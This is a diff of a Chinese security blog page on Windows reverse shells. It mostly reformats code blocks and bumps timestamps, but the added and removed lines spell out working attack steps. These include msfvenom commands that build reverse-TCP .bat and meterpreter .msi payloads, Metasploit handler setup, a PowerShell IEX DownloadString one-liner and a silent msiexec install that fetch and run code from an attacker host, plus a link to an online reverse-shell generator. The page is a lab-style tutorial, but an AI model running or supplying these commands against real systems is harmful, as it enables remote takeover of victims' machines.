@@ -21,7 +21,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://my.lipeilipei.top/images/2020/20201120123010.png">
 <meta property="article:published_time" content="2020-10-01T04:00:00.000Z">
-<meta property="article:modified_time" content="2020-11-22T07:10:58.109Z">
+<meta property="article:modified_time" content="2020-11-22T08:05:28.813Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="安全">
@@ -196,7 +196,7 @@ var _hmt = _hmt || [];
 <div class="article-date">
   <i class="fa fa-calendar-plus-o"></i>
   <a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="article-date">
-     <time datetime="2020-11-22T07:10:58.109Z" itemprop="dateModified">2020-11-22</time>
+     <time datetime="2020-11-22T08:05:28.813Z" itemprop="dateModified">2020-11-22</time>
   </a>
 </div>
 
@@ -345,19 +345,29 @@ var _hmt = _hmt || [];
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;windows&#x2F;powershell_reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;1234 &gt; 1.bat</span><br></pre></td></tr></table></figure>
 
 <p>msf 建立一个反向监听</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1234</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">python 开启web服务，使目标机器可以访问这个 1.vbs</span><br></pre></td></tr></table></figure>
-<p>python –m http.server 8000</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在目标机器上执行以下命令，msf 就可以看到反弹的session</span><br></pre></td></tr></table></figure>
-<p>powershell -c “IEX(New-Object System.Net.WebClient).DownloadString(‘<a href="http://192.168.1.227:8000/1.bat&#39;)&quot;" target="_blank" rel="noopener">http://192.168.1.227:8000/1.bat&#39;)&quot;</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 七、Msiexec 反弹 shell</span><br><span class="line">&gt; Windows 系统安装有一个 Windows 安装引擎，MSI 包使用 msiexe.exe 来解释安装。</span><br><span class="line"></span><br><span class="line">先用 msfvenom 生成一个恶意 msi 文件</span><br></pre></td></tr></table></figure>
-<p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.227 lport=1237 -f msi &gt; 1.msi</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf 建立一个反向监听</span><br></pre></td></tr></table></figure>
-<p>msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.227 -P 1237</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python 开启web服务，使目标机器可以访问这个 1.vbs</span><br></pre></td></tr></table></figure>
-<p>python –m http.server 8000</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在目标机器上执行以下命令，msf 就能获取反弹的 session</span><br></pre></td></tr></table></figure>
-<p>msiexec /q /i <a href="http://192.168.1.227:8000/1.msi" target="_blank" rel="noopener">http://192.168.1.227:8000/1.msi</a></p>
-<p>```</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1234</span><br></pre></td></tr></table></figure>
+
+<p>python 开启web服务，使目标机器可以访问这个 1.vbs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python –m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上执行以下命令，msf 就可以看到反弹的session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;1.bat&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、Msiexec-反弹-shell"><a href="#七、Msiexec-反弹-shell" class="headerlink" title="七、Msiexec 反弹 shell"></a>七、Msiexec 反弹 shell</h2><blockquote>
+<p>Windows 系统安装有一个 Windows 安装引擎，MSI 包使用 msiexe.exe 来解释安装。</p>
+</blockquote>
+<p>先用 msfvenom 生成一个恶意 msi 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;1237 -f msi &gt; 1.msi</span><br></pre></td></tr></table></figure>
+
+<p>msf 建立一个反向监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1237</span><br></pre></td></tr></table></figure>
+
+<p>python 开启web服务，使目标机器可以访问这个 1.vbs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python –m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上执行以下命令，msf 就能获取反弹的 session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;1.msi</span><br></pre></td></tr></table></figure>
+
 <hr>
 <p>其他：在线生成 shell 的网站<br><a href="https://krober.biz/misc/reverse_shell.php?ip=218.70.84.146&amp;port=443" target="_blank" rel="noopener">https://krober.biz/misc/reverse_shell.php?ip=218.70.84.146&amp;port=443</a></p>
 
@@ -431,7 +441,7 @@ NC 正向 shell
 
 控制端：
 1nc 192.168.1.62 666",
-        "wordCount": 771
+        "wordCount": 752
     }
 </script>
 
